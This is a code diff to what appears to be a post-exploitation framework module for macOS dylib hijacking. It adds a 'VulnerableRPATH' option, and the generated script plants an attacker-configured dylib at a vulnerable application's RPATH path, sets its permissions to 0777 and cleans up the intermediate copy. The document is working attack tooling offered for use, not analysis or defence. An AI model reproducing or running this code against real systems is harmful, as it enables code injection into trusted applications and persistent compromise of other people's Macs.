@@ -50,6 +50,11 @@ class Module:
                 'Description'   :   'Full path to the legitimate dylib of the vulnerable application',
                 'Required'      :   True,
                 'Value'         :   ''
+            },
+            'VulnerableRPATH' : {
+                'Description'   :   'Full path to where the hijacker should be planted. This will be the RPATH in the Hijack Scanner module.',
+                'Required'      :   True,
+                'Value'         :   ''
             }
         }
 
@@ -78,6 +83,7 @@ class Module:
         #   original reference script included in the comments.
         hijacker = self.options['HijackerPath']['Value']
         dylib = self.options['DylibPath']['Value']
+        vrpath = self.options['VulnerableRPATH']['Value']
 
         script = """
 from ctypes import *
@@ -90,6 +96,7 @@ def run():
     import fcntl
     import shutil
     import struct
+    import stat
 
 
     LC_REQ_DYLD = 0x80000000
@@ -455,6 +462,8 @@ def run():
     #target .dylib
     targetDYLIB = "%s"
 
+    vrpath = "%s"
+
     #configured .dylib
     configuredDYLIB = ""
 
@@ -490,11 +499,17 @@ def run():
     shutil.copy2(attackerDYLIB, configuredDYLIB)
 
     os.remove(attackerDYLIB)
+    if not os.path.exists(os.path.split(vrpath)[0]):
+        os.makedirs(os.path.split(vrpath)[0])
 
+    os.chmod(configuredDYLIB, 0777)
+    shutil.copy2(configuredDYLIB, vrpath)
+
+    os.remove(configuredDYLIB)
     #dbg msg
-    print '\\nsuccessfully configured %%s (locally renamed to: %%s) as a compatible hijacker for %%s!\\n' %% (os.path.split(attackerDYLIB)[1], os.path.split(targetDYLIB)[1], os.path.split(targetDYLIB)[1])
-
+    
+    print '\\nHijacker created, renamed to %%s, and copied to %%s' %% (configuredDYLIB,vrpath)
 run()
-""" % (hijacker, dylib)
+""" % (hijacker,dylib,vrpath)
 
         return script
